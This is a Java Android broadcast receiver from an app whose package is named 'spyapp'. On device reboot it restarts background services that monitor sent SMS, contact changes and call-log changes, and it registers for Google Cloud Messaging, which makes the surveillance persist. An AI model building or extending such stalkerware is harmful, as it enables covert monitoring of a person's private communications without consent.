package com.app.spyapp.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;

import com.app.spyapp.common.WriteLog;
import com.app.spyapp.gcm.RegistrationIntentService;
import com.app.spyapp.service.CallLogChangeService;
import com.app.spyapp.service.ContactAddService;
import com.google.android.gms.common.ConnectionResult;
import com.google.android.gms.common.GoogleApiAvailability;


public class BootReceiver extends BroadcastReceiver {
    private Context context;

    @Override
    public void onReceive(Context context, Intent intent) {
        this.context = context;
        WriteLog.E(BootReceiver.class.getSimpleName(), "Reboot Device");
        recallAllServices(context);

    }

    /**
     * Recall all services which are stop due to phone switchoff
     *
     * @param context
     */
    private void recallAllServices(Context context) {
        registerGCM();
        //Callling service for gettting broadcast for smsSent
        Intent sentsmsintent = new Intent(context, SendSMSInfoService.class);
        context.startService(sentsmsintent);
        //calling service for getting event of contact change
        Intent contactAddIntent = new Intent(context, ContactAddService.class);
        context.startService(contactAddIntent);
        //calling service for getting event of callog change
        Intent callogIntent = new Intent(context, CallLogChangeService.class);
        context.startService(callogIntent);

        //calling service for getting event of bookmark change
//        Intent bookmarkchangeIntent = new Intent(context, BookmarkHistoryChangeService.class);
//        context.startService(bookmarkchangeIntent);
    }


    /**
     * Check the device to make sure it has the Google Play Services APK. If
     * it doesn't, display a dialog that allows users to download the APK from
     * the Google Play Store or enable it in the device's system settings.
     */
    private boolean checkPlayServices() {
        GoogleApiAvailability apiAvailability = GoogleApiAvailability.getInstance();
        int resultCode = apiAvailability.isGooglePlayServicesAvailable(context);
        if (resultCode != ConnectionResult.SUCCESS) {
            return false;
        }
        return true;
    }

    private void registerGCM() {
        if (checkPlayServices()) {
            // Start IntentService to register this application with GCM.
            Intent intent = new Intent(context, RegistrationIntentService.class);
            context.startService(intent);
        }
//        Intent intent=new Intent(HomeActivity.this, ContactService.class);
//        startService(intent);
    }
}
